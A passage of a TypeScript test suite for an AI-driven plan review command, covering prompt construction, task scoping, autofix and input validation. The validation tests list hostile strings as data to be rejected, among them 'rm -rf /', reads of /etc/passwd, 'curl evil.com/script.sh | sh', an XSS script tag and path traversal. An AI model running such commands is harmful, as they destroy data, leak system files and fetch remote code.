            tasks: [
              {
                title: 'Parent task',
                description: 'A parent task',
              },
            ],
          };
        }
        if (filePath === childPlanFile) {
          return {
            id: 101,
            title: 'Child Plan',
            goal: 'Child goal that implements parent',
            parent: 99,
            tasks: [
              {
                title: 'Child task',
                description: 'A child task',
              },
            ],
          };
        }
        return null;
      },
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'codex-cli',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: (
        planData: any,
        diffResult: any,
        includeDiff: boolean = false,
        useSubagents: boolean = false,
        parentChain: any[] = [],
        completedChildren: any[] = []
      ) => {
        // Create a test prompt that includes parent context when parent is provided
        let prompt = `REVIEWER AGENT\n\n`;

        if (parentChain && parentChain.length > 0) {
          const parentPlan = parentChain[0];
          prompt += `# Parent Plan Context\n\n`;
          prompt += `**Parent Plan ID:** ${parentPlan.id}\n`;
          prompt += `**Parent Title:** ${parentPlan.title}\n`;
          prompt += `**Parent Goal:** ${parentPlan.goal}\n\n`;
        }

        prompt += `# Plan Context\n\n`;
        prompt += `**Plan ID:** ${planData.id}\n`;
        prompt += `**Title:** ${planData.title}\n`;
        prompt += `**Goal:** ${planData.goal}\n\n`;

        return prompt;
      },
    }));

    const mockCommand = {
      parent: {
        opts: () => ({
          config: testDir,
        }),
      },
    };

    await handleReviewCommand(childPlanFile, {}, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });
});

describe('Hierarchy integration with utilities', () => {
  test('handles multiple levels of parent plans', async () => {
    const grandparentPlan: PlanWithFilename = {
      id: 50,
      title: 'Root Project Plan',
      goal: 'Implement the entire project',
      details: 'This is the top-level project plan',
      tasks: [],
      filename: 'grandparent-50.yml',
    };

    const parentPlan: PlanWithFilename = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement review functionality',
      details: 'Mid-level plan for review features',
      parent: 50,
      tasks: [],
      filename: 'parent-99.yml',
    };

    const childPlan: PlanSchema = {
      id: 101,
      title: 'PR review command - Parent-Child Integration',
      goal: 'Enhance review command with hierarchy support',
      parent: 99,
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/review.ts'],
      baseBranch: 'main',
      diffContent: 'test diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    // Test with multi-level parent chain
    const parentChain = [parentPlan, grandparentPlan];
    const prompt = buildReviewPrompt(childPlan, diffResult, true, false, parentChain, []);

    // Verify both parent levels are included
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** PR review command');
    expect(prompt).toContain('**Grandparent (Level 2) Plan ID:** 50');
    expect(prompt).toContain('**Grandparent (Level 2) Title:** Root Project Plan');
    expect(prompt).toContain('---'); // Section separator
    expect(prompt).toContain(
      'This review is for a child plan implementing part of the parent plans above'
    );
  });

  test('includes completed children when reviewing parent plan', async () => {
    const parentPlan: PlanSchema = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement complete review functionality',
      tasks: [
        {
          title: 'Parent task',
          description: 'High-level task',
        },
      ],
    };

    const completedChild1: PlanWithFilename = {
      id: 100,
      title: 'Core Review Implementation',
      goal: 'Implement basic review command',
      details: 'This child handles the core review logic',
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-100.yml',
    };

    const completedChild2: PlanWithFilename = {
      id: 101,
      title: 'Parent-Child Integration',
      goal: 'Add hierarchy support to review',
      details: 'This child adds parent-child relationship handling',
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-101.yml',
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/review.ts', 'src/hierarchy.ts'],
      baseBranch: 'main',
      diffContent: 'parent review diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const completedChildren = [completedChild1, completedChild2];
    const prompt = buildReviewPrompt(parentPlan, diffResult, true, false, [], completedChildren);

    // Verify completed children section is included
    expect(prompt).toContain('# Completed Child Plans');
    expect(prompt).toContain(
      'The following child plans have been completed as part of this parent plan:'
    );
    expect(prompt).toContain('**Child Plan ID:** 100');
    expect(prompt).toContain('**Child Title:** Core Review Implementation');
    expect(prompt).toContain('**Child Goal:** Implement basic review command');
    expect(prompt).toContain('**Child Plan ID:** 101');
    expect(prompt).toContain('**Child Title:** Parent-Child Integration');
    expect(prompt).toContain(
      'consider how these completed children contribute to the overall goals'
    );
  });

  test('handles both parent chain and completed children together', async () => {
    const grandparentPlan: PlanWithFilename = {
      id: 50,
      title: 'Project Root',
      goal: 'Top level goal',
      tasks: [],
      filename: 'grandparent-50.yml',
    };

    const parentPlan: PlanWithFilename = {
      id: 99,
      title: 'Middle Plan',
      goal: 'Middle level goal',
      parent: 50,
      tasks: [],
      filename: 'parent-99.yml',
    };

    const currentPlan: PlanSchema = {
      id: 101,
      title: 'Current Plan',
      goal: 'Current plan goal',
      parent: 99,
      tasks: [
        {
          title: 'Current task',
          description: 'Task description',
        },
      ],
    };

    const completedChild: PlanWithFilename = {
      id: 102,
      title: 'Completed Child',
      goal: 'Child goal',
      status: 'done',
      parent: 101,
      tasks: [],
      filename: 'child-102.yml',
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'complex diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const parentChain = [parentPlan, grandparentPlan];
    const completedChildren = [completedChild];
    const prompt = buildReviewPrompt(
      currentPlan,
      diffResult,
      true,
      false,
      parentChain,
      completedChildren
    );

    // Verify both parent and children contexts are included in correct order
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Grandparent (Level 2) Plan ID:** 50');

    expect(prompt).toContain('# Completed Child Plans');
    expect(prompt).toContain('**Child Plan ID:** 102');

    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');

    // Verify order: parent context, then children context, then current plan context
    const parentIndex = prompt.indexOf('# Parent Plan Context');
    const childrenIndex = prompt.indexOf('# Completed Child Plans');
    const planIndex = prompt.indexOf('# Plan Context');

    expect(parentIndex).toBeLessThan(childrenIndex);
    expect(childrenIndex).toBeLessThan(planIndex);
  });

  test('handles plan without ID gracefully', async () => {
    const planWithoutId: PlanSchema = {
      // No ID field
      title: 'Plan Without ID',
      goal: 'Test plan without ID',
      tasks: [
        {
          title: 'Test task',
          description: 'Task description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'simple diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    // Should not attempt hierarchy traversal without an ID
    const prompt = buildReviewPrompt(planWithoutId, diffResult, true, false, [], []);

    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('# Completed Child Plans');
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Title:** Plan Without ID');
  });

  test('handles empty parent chain and children arrays', async () => {
    const simplePlan: PlanSchema = {
      id: 1,
      title: 'Simple Plan',
      goal: 'Simple goal',
      tasks: [
        {
          title: 'Simple task',
          description: 'Simple description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['simple.ts'],
      baseBranch: 'main',
      diffContent: 'simple diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(simplePlan, diffResult, true, false, [], []);

    // Should work like before - no parent or children sections
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('# Completed Child Plans');
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 1');
    expect(prompt).toContain('**Title:** Simple Plan');
  });

  test('handles plan hierarchy with missing plan details gracefully', async () => {
    const parentWithoutDetails: PlanWithFilename = {
      id: 99,
      title: 'Parent Plan',
      goal: 'Parent goal',
      // No details field
      tasks: [],
      filename: 'parent-99.yml',
    };

    const childWithoutDetails: PlanWithFilename = {
      id: 101,
      title: 'Child Plan',
      goal: 'Child goal',
      // No details field
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-101.yml',
    };

    const currentPlan: PlanSchema = {
      id: 100,
      title: 'Current Plan',
      goal: 'Current goal',
      parent: 99,
      tasks: [
        {
          title: 'Task',
          description: 'Description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'test diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(
      currentPlan,
      diffResult,
      true,
      false,
      [parentWithoutDetails],
      [childWithoutDetails]
    );

    // Should include basic info but not try to include missing details
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** Parent Plan');
    expect(prompt).toContain('**Parent Goal:** Parent goal');
    expect(prompt).not.toContain('**Parent Details:**');

    expect(prompt).toContain('**Child Plan ID:** 101');
    expect(prompt).toContain('**Child Title:** Child Plan');
    expect(prompt).toContain('**Child Goal:** Child goal');
    expect(prompt).not.toContain('**Child Details:**');
  });
});

// Security tests for the implemented security fixes
describe('Security fixes', () => {
  describe('Branch name sanitization', () => {
    test('rejects branch name with command injection attempts', async () => {
      // Test branch names that could potentially be used for command injection
      const maliciousBranches = [
        'main; rm -rf /',
        'main && echo "hacked"',
        'main | cat /etc/passwd',
        'main`echo hacked`',
        'main$(echo hacked)',
        'main & echo hacked &',
        'main\nrm -rf /',
        'main; cat /etc/passwd > output.txt',
        'main || curl evil.com/script.sh | sh',
        '../../../main',
        '..\\..\\main',
      ];

      for (const maliciousBranch of maliciousBranches) {
        // Test the sanitization function directly
        expect(() => sanitizeBranchName(maliciousBranch)).toThrow('Invalid branch name format');
      }
    });

    test('accepts valid branch names', async () => {
      const validBranches = [
        'main',
        'master',
        'feature/new-feature',
        'bugfix/issue-123',
        'release-1.0.0',
        'dev',
        'staging',
        'feature_branch',
        'hotfix.urgent',
        'user/john/feature',
        'v1.2.3',
      ];

      for (const validBranch of validBranches) {
        // Test the sanitization function directly instead of the full generateDiffForReview
        // since mocking Bun's $ utility is complex

        // Should not throw an error for valid branch names
        expect(() => sanitizeBranchName(validBranch)).not.toThrow();
        expect(sanitizeBranchName(validBranch)).toBe(validBranch);
      }
    });

    test('sanitizes branch name in both git and jj modes', async () => {
      const maliciousBranch = 'main; rm -rf /';

      // Test the sanitization function directly - it should reject malicious input
      expect(() => sanitizeBranchName(maliciousBranch)).toThrow('Invalid branch name format');

      // The sanitizeBranchName function is used in both git and jj code paths in generateDiffForReview
      // So testing it directly verifies protection in both modes
    });
  });

  describe('Input validation for plan files', () => {
    test('validates multiple tasks correctly', async () => {
      const planFile = join(testDir, 'multiple-invalid-tasks.yml');

      await moduleMocker.mock('../utils/context_gathering.js', () => ({
        gatherPlanContext: async () => {
          throw new Error('tasks.1.title: Invalid input: expected string, received undefined');
        },
      }));

      await moduleMocker.mock('../configLoader.js', () => ({
        loadEffectiveConfig: async () => ({}),
      }));

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
        'tasks.1.title: Invalid input: expected string, received undefined'
      );
    });
  });

  describe('Large diff protection', () => {
    test('has correct size limit constant', async () => {
      // Test that the MAX_DIFF_SIZE constant is properly set to 10MB
      const reviewModule = await import('./review.js');
      // We can't directly access the constant, but we can test the logic indirectly

      // Create a string that exceeds 10MB (10 * 1024 * 1024 bytes)
      const largeDiff = 'a'.repeat(11 * 1024 * 1024); // 11MB
      const largeDiffSizeInBytes = Buffer.byteLength(largeDiff, 'utf8');

      expect(largeDiffSizeInBytes).toBeGreaterThan(10 * 1024 * 1024);

      // The protection logic uses Buffer.byteLength to check size, which is the right approach
      // for UTF-8 string length checking
    });

    test('diff size calculation works correctly', () => {
      // Test that byte length calculation works correctly for different string types
      const smallString = 'hello';
      const mediumString = 'a'.repeat(1024); // 1KB
      const unicodeString = '🔒'.repeat(100); // Unicode characters take more bytes

      expect(Buffer.byteLength(smallString, 'utf8')).toBe(5);
      expect(Buffer.byteLength(mediumString, 'utf8')).toBe(1024);
      expect(Buffer.byteLength(unicodeString, 'utf8')).toBeGreaterThan(100); // Unicode takes more bytes
    });
  });

  describe('Error handling improvements', () => {
    test('error message format includes exit codes and stderr', () => {
      // Test that our error message format includes the expected information
      const exitCode = 128;
      const stderr = 'fatal: not a git repository';
      const expectedMessage = `git diff --name-only command failed (exit code ${exitCode}): ${stderr}`;

      expect(expectedMessage).toContain('git diff --name-only command failed');
      expect(expectedMessage).toContain('exit code 128');
      expect(expectedMessage).toContain('fatal: not a git repository');
    });

    test('jj error message format includes exit codes and stderr', () => {
      // Test that our jj error message format includes the expected information
      const exitCode = 1;
      const stderr = 'Error: No jj repo in current directory';
      const expectedMessage = `jj diff --summary command failed (exit code ${exitCode}): ${stderr}`;

      expect(expectedMessage).toContain('jj diff --summary command failed');
      expect(expectedMessage).toContain('exit code 1');
      expect(expectedMessage).toContain('Error: No jj repo in current directory');
    });

    test('error context wrapping format', () => {
      // Test that error wrapping preserves the original error message
      const originalError = 'Unexpected error';
      const wrappedMessage = `Failed to generate git diff: ${originalError}`;

      expect(wrappedMessage).toContain('Failed to generate git diff');
      expect(wrappedMessage).toContain('Unexpected error');
    });

    test('handles executor errors properly in review command', async () => {
      const planContent = `
id: 1
title: Test Plan
goal: Test goal
tasks:
  - title: Test task
    description: A test task
`;
      const planFile = join(testDir, 'error-test.yml');
      await writeFile(planFile, planContent);

      const mockExecutor = {
        execute: async () => {
          throw new Error('Network timeout');
        },
      };

      await moduleMocker.mock('../plans.js', () => ({
        resolvePlanFile: async () => planFile,
        readPlanFile: async () => ({
          id: 1,
          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        }),
      }));

      await moduleMocker.mock('../configLoader.js', () => ({
        loadEffectiveConfig: async () => ({}),
      }));

      await moduleMocker.mock('../executors/index.js', () => ({
        buildExecutorAndLog: () => mockExecutor,
        DEFAULT_EXECUTOR: 'codex-cli',
      }));

      await moduleMocker.mock('../../common/git.js', () => ({
        getGitRoot: async () => testDir,
      }));

      await moduleMocker.mock('./review.js', () => ({
        handleReviewCommand,
        generateDiffForReview: async () => ({
          hasChanges: true,
          changedFiles: ['test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        }),
        buildReviewPrompt: (
          planData: any,
          diffResult: any,
          includeDiff: boolean = false,
          useSubagents: boolean = false,
          parentChain: any[] = [],
          completedChildren: any[] = [],
          customInstructions?: string
        ) => 'test prompt',
      }));

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
        'Review execution failed: Network timeout'
      );
    });
  });

  describe('Focus areas validation', () => {
    test('prevents injection attacks in focus areas', () => {
      const maliciousFocusAreas = [
        ['security; rm -rf /'],
        ['performance && echo hacked'],
        ['testing | cat /etc/passwd'],
        ['review`echo hacked`'],
        ['focus$(echo hacked)'],
        ['area\nrm -rf /'],
        ['<script>alert("xss")</script>'],
        ['${process.env.HOME}'],
        ['../../../etc/passwd'],
        ['focus\x00hidden'],
      ];

      for (const maliciousAreas of maliciousFocusAreas) {
        expect(() => validateFocusAreas(maliciousAreas)).toThrow(
          /Focus area contains invalid characters/
        );
      }
    });

    test('allows safe focus areas', () => {
      const safeFocusAreas = [
        ['security', 'performance'],
        ['code-quality', 'testing'],
        ['review_guidelines'],
        ['API.design'],
        ['user-experience'],
        ['data_validation'],
        ['error handling'],
        ['documentation'],
      ];

      for (const safeAreas of safeFocusAreas) {
        expect(() => validateFocusAreas(safeAreas)).not.toThrow();
        const result = validateFocusAreas(safeAreas);
        expect(result).toEqual(safeAreas);
      }
    });

    test('enforces focus area limits', () => {
      const tooManyAreas = Array(15).fill('area');
      expect(() => validateFocusAreas(tooManyAreas)).toThrow('Too many focus areas specified');

      const tooLongArea = ['a'.repeat(100)];
      expect(() => validateFocusAreas(tooLongArea)).toThrow('Focus area too long');
    });

    test('filters empty and whitespace-only areas', () => {
      const areasWithEmpty = ['security', '', '   ', 'performance', '\t'];
      const result = validateFocusAreas(areasWithEmpty);
      expect(result).toEqual(['security', 'performance']);
    });

    test('validates input type for focus areas', () => {
      expect(() => validateFocusAreas(null as any)).toThrow('Focus areas must be an array');
      expect(() => validateFocusAreas('not-array' as any)).toThrow('Focus areas must be an array');
      expect(() => validateFocusAreas(42 as any)).toThrow('Focus areas must be an array');
    });
  });

  describe('Review task scoping', () => {
    test('returns original plan when no filters are provided', () => {
      const planData: PlanSchema = {
        id: 1,
        title: 'Scoped Plan',
        goal: 'Test scoping',
        tasks: [
          { title: 'Task One', description: 'First task', done: false },
          { title: 'Task Two', description: 'Second task', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, {});

      expect(result.planData).toBe(planData);
      expect(result.taskScopeNote).toBeUndefined();
      expect(result.isScoped).toBe(false);
    });

    test('filters tasks by index and preserves order', () => {
      const planData: PlanSchema = {
        id: 2,
        title: 'Index Filter Plan',
        goal: 'Test index filters',
        tasks: [
          { title: 'Task One', description: 'First task', done: false },
          { title: 'Task Two', description: 'Second task', done: false },
          { title: 'Task Three', description: 'Third task', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskIndex: ['1', '3'] }); // 1-based indices

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Task One', 'Task Three']);
      expect(result.taskScopeNote).toContain('(2 of 3)');
      expect(result.isScoped).toBe(true);
    });

    test('preserves original task indexes when filtering', () => {
      const planData: PlanSchema = {
        id: 2,
        title: 'Original Index Plan',
        goal: 'Test original index preservation',
        tasks: [
          { title: 'Task One', description: 'First task', done: false },
          { title: 'Task Two', description: 'Second task', done: false },
          { title: 'Task Three', description: 'Third task', done: false },
          { title: 'Task Four', description: 'Fourth task', done: false },
          { title: 'Task Five', description: 'Fifth task', done: false },
        ],
      };

      // Select tasks 2 and 4 (1-based)
      const result = resolveReviewTaskScope(planData, { taskIndex: ['2', '4'] });

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Task Two', 'Task Four']);
      // Verify original 1-based indexes are preserved
      expect(result.planData.tasks?.map((task: any) => task.originalIndex)).toEqual([2, 4]);
      expect(result.isScoped).toBe(true);
    });

    test('filters tasks by title case-insensitively and includes duplicates', () => {
      const planData: PlanSchema = {
        id: 3,
        title: 'Title Filter Plan',
        goal: 'Test title filters',
        tasks: [
          { title: 'Build', description: 'First', done: false },
          { title: 'Test', description: 'Second', done: false },
          { title: 'build', description: 'Third', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskTitle: ['BUILD'] });

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Build', 'build']);
      expect(result.isScoped).toBe(true);
    });

    test('supports comma-separated task filters and unions matches', () => {
      const planData: PlanSchema = {
        id: 5,
        title: 'Comma Filter Plan',
        goal: 'Test comma filters',
        tasks: [
          { title: 'Alpha', description: 'First', done: false },
          { title: 'Beta', description: 'Second', done: false },
          { title: 'Gamma', description: 'Third', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, {
        taskIndex: ['1,3'], // 1-based indices
        taskTitle: ['Beta'],
      });

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Alpha', 'Beta', 'Gamma']);
      expect(result.isScoped).toBe(true);
    });

    test('rejects non-integer task index filters', () => {
      const planData: PlanSchema = {
        id: 6,
        title: 'Invalid Index Plan',
        goal: 'Test invalid indexes',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      expect(() => resolveReviewTaskScope(planData, { taskIndex: ['1.5'] })).toThrow(
        'Invalid task indexes: 1.5'
      );
    });

    test('reports unknown task indexes and titles', () => {
      const planData: PlanSchema = {
        id: 4,
        title: 'Error Plan',
        goal: 'Test unknown filters',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      expect(() =>
        resolveReviewTaskScope(planData, { taskIndex: ['5'], taskTitle: ['Missing Task'] })
      ).toThrow('Unknown task indexes: 5; Unknown task titles: Missing Task');
    });

    test('reports negative indexes as invalid alongside missing titles', () => {
      const planData: PlanSchema = {
        id: 7,
        title: 'Negative Index Plan',
        goal: 'Test negative indexes',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      // -1 is treated as invalid (not a valid 1-based index)
      expect(() =>
        resolveReviewTaskScope(planData, { taskIndex: ['-1'], taskTitle: ['Missing Task'] })
      ).toThrow('Invalid task indexes: -1; Unknown task titles: Missing Task');
    });
  });
});

describe('Custom review instructions', () => {
  test('validateInstructionsFilePath rejects malicious paths and accepts safe ones', () => {
    const gitRoot = '/safe/project';

    // Test path traversal protection
    expect(() => validateInstructionsFilePath('../../../etc/passwd', gitRoot)).toThrow();
    expect(() => validateInstructionsFilePath('/etc/passwd', gitRoot)).toThrow();

    // Test safe paths
    expect(() => validateInstructionsFilePath('instructions.md', gitRoot)).not.toThrow();
    expect(() => validateInstructionsFilePath('./docs/review.md', gitRoot)).not.toThrow();
  });

  test('validateFocusAreas rejects malicious input and accepts safe areas', () => {
    // Test injection protection
    expect(() => validateFocusAreas(['security; rm -rf /'])).toThrow();
    expect(() => validateFocusAreas(['performance && echo hacked'])).toThrow();
    expect(() => validateFocusAreas(['<script>alert("xss")</script>'])).toThrow();

    // Test safe focus areas
    expect(() => validateFocusAreas(['security', 'performance', 'testing'])).not.toThrow();
    expect(validateFocusAreas(['security', 'performance'])).toEqual(['security', 'performance']);

    // Test limits
    expect(() => validateFocusAreas(Array(15).fill('area'))).toThrow('Too many focus areas');
    expect(() => validateFocusAreas(['a'.repeat(100)])).toThrow('Focus area too long');
  });

  test('error messages use proper formatting instead of template literals', () => {
    // Test that our error handling fixes work correctly
    const error = new Error('Test error');
    const errorMessage = error instanceof Error ? error.message : String(error);
    expect(errorMessage).toBe('Test error');

    // Test string coercion for non-Error objects
    const nonError = { message: 'Not an error object' };
    const nonErrorMessage = nonError instanceof Error ? nonError.message : String(nonError);
    expect(nonErrorMessage).toBe('[object Object]');
  });

  test('properly handles buildReviewPrompt function signature with custom instructions', () => {
    // Test that buildReviewPrompt accepts the customInstructions parameter
    const planData = { id: 1, title: 'Test', goal: 'Test goal', tasks: [] };
    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'diff',
    };

    // This should not throw and should work with the new signature
    expect(() =>
      buildReviewPrompt(planData, diffResult, true, false, [], [], 'custom instructions')
    ).not.toThrow();
    expect(() => buildReviewPrompt(planData, diffResult, true, false, [], [])).not.toThrow();
  });

  test('validates function signatures work correctly after security fixes', () => {
    // Test that all our security functions work as expected
    const gitRoot = '/test/project';

    // Test validateInstructionsFilePath with various inputs
    expect(() => validateInstructionsFilePath('safe-file.md', gitRoot)).not.toThrow();
    expect(() => validateInstructionsFilePath('../unsafe', gitRoot)).toThrow();

    // Test validateFocusAreas with various inputs
    expect(() => validateFocusAreas(['safe', 'areas'])).not.toThrow();
    expect(() => validateFocusAreas(['unsafe; injection'])).toThrow();

    // Test that they return expected values for valid inputs
    const safePath = validateInstructionsFilePath('docs/instructions.md', gitRoot);
    expect(safePath).toContain('docs/instructions.md');

    const safeAreas = validateFocusAreas(['security', 'performance']);
    expect(safeAreas).toEqual(['security', 'performance']);
  });
});

describe('Autofix functionality', () => {
  test('autofix flag executes review then autofix when issues found', async () => {
    const planContent = `
id: 123
title: Test Plan with Issues
goal: Test autofix functionality
tasks:
  - title: Test task
    description: A test task that has issues
`;
    const planFile = join(testDir, 'autofix-test.yml');
    await writeFile(planFile, planContent);

    // Mock checkbox to return all issues when autofix flag is used
    await moduleMocker.mock('@inquirer/prompts', () => ({
      confirm: mock(async () => {
        throw new Error('Confirm should not be called with --autofix flag');
      }),
      checkbox: mock(async ({ choices }: { choices: any[] }) => {
        // Return all issues for autofix
        return choices.map((c) => c.value);
      }),
    }));

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          // First call is the review - return JSON output with issues
          return JSON.stringify({
            issues: [
              {
                severity: 'critical',
                category: 'security',
                content: 'Security Vulnerability - Unsafe input validation',
                file: 'src/input.ts',
                line: '42',
                suggestion: 'Add proper input sanitization',
              },
              {
                severity: 'critical',
                category: 'performance',
                content: 'Performance Issue - N+1 query problem',
                file: 'src/queries.ts',
                line: '100',
                suggestion: 'Use batch queries',
              },
            ],
            recommendations: ['Fix input validation', 'Optimize database queries'],
            actionItems: [],
          });
        } else if (metadata.executionMode === 'normal') {
          // Second call is the autofix
          expect(prompt).toContain('Autofix Request');
          expect(prompt).toContain('Security Vulnerability');
          expect(prompt).toContain('Performance Issue');
          return 'Autofix completed successfully';
        }
        return 'Unexpected execution mode';
      }),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 123,
        title: 'Test Plan with Issues',
        goal: 'Test autofix functionality',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task that has issues',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff content',
      }),
      buildReviewPrompt: (
        planData: any,
        diffResult: any,
        includeDiff: boolean = false,
        useSubagents: boolean = false,
        parentChain: any[] = [],
        completedChildren: any[] = [],
        customInstructions?: string
      ) => 'test review prompt',
      detectIssuesInReview: (reviewResult: any, rawOutput: string) => {
        // Check the reviewResult object for issues (since we're using JSON now)
        return reviewResult.issues && reviewResult.issues.length > 0;
      },
      buildAutofixPrompt: (planData: any, reviewResult: any, diffResult: any) => {
        return `# Autofix Request

## Plan Context

**Plan ID:** ${planData.id}
**Title:** ${planData.title}

## Review Findings

### Issue 1: Security Vulnerability
- Unsafe input validation

### Issue 2: Performance Issue
- N+1 query problem

## Instructions

Please fix all the issues identified in the review.`;
      },
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, { autofix: true }, mockCommand);

    // Verify the executor was called twice: once for review, once for autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(2);

    // Verify the first call was for review (simple mode)
    expect(mockExecutor.execute).toHaveBeenNthCalledWith(
      1,
      'test review prompt',
      expect.objectContaining({
        executionMode: 'review',
        captureOutput: 'result',
      })
    );

    // Verify the second call was for autofix (normal mode)
    expect(mockExecutor.execute).toHaveBeenNthCalledWith(
      2,
      expect.stringContaining('Autofix Request'),
      expect.objectContaining({
        executionMode: 'normal',
        captureOutput: 'none',
      })
    );
  });

  // TODO something flaky about this test
  test.skip('prompts user for autofix when issues found without autofix flag', async () => {
    const planContent = `
id: 124
title: Test Interactive Prompt
goal: Test interactive autofix prompt
tasks:
  - title: Test task
    description: A test task with issues
`;
    const planFile = join(testDir, 'interactive-test.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          return JSON.stringify({
            issues: [
              {
                severity: 'major',
                category: 'bug',
                content: 'Code Quality - Missing error handling',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        } else if (metadata.executionMode === 'normal') {
          return 'Autofix completed';
        }
        return 'Unexpected mode';
      }),
    };

    // Mock the confirm function to return true (user confirms autofix)
    // Also mock checkbox to return all issues
    await moduleMocker.mock('@inquirer/prompts', () => ({
      confirm: mock(async ({ message }: { message: string }) => {
        expect(message).toContain('Issues were found during review');
        expect(message).toContain('automatically fix them');
        return true;
      }),
      select: mock(async ({ choices }: { choices: any[] }) => {
        // Return first choice
        return choices[0].value;
      }),
      checkbox: mock(async ({ choices }: { choices: any[] }) => {
        // Return all choices
        return choices.map((choice: any) => choice.value);
      }),
    }));

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 124,
        title: 'Test Interactive Prompt',
        goal: 'Test interactive autofix prompt',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task with issues',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
